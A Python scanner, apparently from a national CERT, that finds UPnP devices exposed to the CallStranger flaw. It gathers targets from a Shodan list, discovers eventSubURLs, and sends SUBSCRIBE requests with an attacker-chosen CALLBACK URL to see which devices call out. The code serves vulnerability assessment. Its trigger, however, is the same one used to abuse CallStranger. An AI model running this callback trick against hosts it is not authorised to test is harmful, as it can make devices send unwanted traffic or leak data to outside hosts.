#!/usr/bin/env python3

## CallStranger scanner
# Usage:
# 1. install dependencies (python3, requests, urllib3) (see Installation)
# 2. create list of potentialy vulnerable hosts (one ip per line). eg.
#    ```
#    shodan download port1900.json "port:1900 country:sk"
#    gunzip port1900.json.gz | jq -r .ip_str | sort | uniq | shuf > ips
#    ```
# (optional) 3. tweak TIMEOUT and MAX_ATTEMPTS
# 4. prepare your callback web server (any http server will do)
# 5. run the scan
#    ```
#    ./scan.py ips "http://x.x.x.x:80/callback" | tee scan.log
#    ```
# 6. collect results from httpd logs on your callback host (x.x.x.x)
#

# Output:
# - stdout - CSV of all identified eventSubURLs in following format:
#     "host;eventSubURL;http-status-code;http-response-len")
#   devices that responded with http status 200 are most likely vulnerable.
#     `grep ';200;[^;]*$' scan.log | cut -d';' -f1 | sort | uniq`
#   (tested only on small sample. might produce false positives. better check your httpd logs...)
#
# - stderr - errors and other debugging stuff  :)
#

# Installation:
# ```
# apt-get install -y python3-virtualenv
# virtualenv -p python3 callstranger
# . ./callstranger/bin/activate
# pip3 install requests
# ```

# jsk @ SK-CERT, 2020-04-13

import sys, re, socket, requests, xml.etree.ElementTree, time, urllib3

def debug(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)

def fail(*args, **kwargs):
    print(*args, file=sys.stderr, **kwargs)
    sys.exit(1)


#XXX: tweakables
# maximum duration of scan is SSDP_TIMEOUT * SSDP_MAX_ATTEMPTS * len(argv[1]) * SSDP_SLEEP
SSDP_TIMEOUT = 10
SSDP_MAX_ATTEMPTS = 10
SSDP_SLEEP = 0.1

# upnp client timeout for callback
UPNP_TIMEOUT = 180

# parse arguments
if len(sys.argv) != 3:
    fail("usage: %s IP_LIST CALLBACK" % sys.argv[0])

UPNP_CALLBACK = sys.argv[2]
hosts = { line.strip(): {} for line in open(sys.argv[1], 'r')}


# 1. perform SSDP service discovery on all hosts
s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM, socket.IPPROTO_UDP)
s.settimeout(SSDP_TIMEOUT)
msg = [
    'M-SEARCH * HTTP/1.1',
    'Host:239.255.255.250:1900',
    'ST:%s' % 'upnp:rootdevice',
    'Man:"ssdp:discover"',
    'MX:1',
    '']

for attempt in range(SSDP_MAX_ATTEMPTS):
    ips_without_ssdp = list(ip for ip in hosts.keys() if 'ssdp' not in hosts[ip])
    if len(ips_without_ssdp) == 0:
        break
    for ip in ips_without_ssdp:
        debug("send SSDP discovery to %s" % ip)
        s.sendto('\r\n'.join(msg).encode(), (ip, 1900))
        time.sleep(SSDP_SLEEP)

    while True:
        try:
            data, (remote, port) = s.recvfrom(32*1024)
            if remote in hosts:
                urls = re.findall('location:[ ]*(.*)', data.decode('utf-8'), re.IGNORECASE)
                hosts[remote]['services_urls'] = list(re.sub('://([^:/]*)([:/])', '://'+remote+'\\2', url.strip()) for url in urls)
                hosts[remote]['ssdp'] = data
                debug("got %d service urls from %s" % (len(hosts[remote]['services_urls']), remote))
            else:
                debug("ssdp response from unexpected host.", remote, data)
        except socket.timeout:
            break



# 2. download service xml
for ip, host in hosts.items():
    if 'services_urls' not in host:
        continue
    for url in host['services_urls']:
        r = requests.get(url)
        base_url = '/'.join(url.split('/')[:3])
        doc = xml.etree.ElementTree.fromstring(r.text)
        elements = doc.findall('.//n:eventSubURL', namespaces=dict(n='urn:schemas-upnp-org:device-1-0'))
        hosts[ip]['event_sub_urls'] = list(base_url + url.text for url in elements)
        debug("got %d eventSubURLs from %s" % (len(hosts[ip]['event_sub_urls']), url))


# 3. test each eventSubURL for callback vulnerability
headers = {
    'NT': 'upnp:event',
    'TIMEOUT': 'Second-%d' % UPNP_TIMEOUT,
    'CALLBACK': '<%s>' % UPNP_CALLBACK,
}
http = urllib3.PoolManager()
for ip, host in hosts.items():
    if 'event_sub_urls' not in host:
        continue
    for url in host['event_sub_urls']:
        resp = http.request('SUBSCRIBE', url, headers=headers)
        print(';'.join(str(v) for v in [ip, url, resp.status, len(resp.data)]))


# 4. collect results on callback url
# XXX:
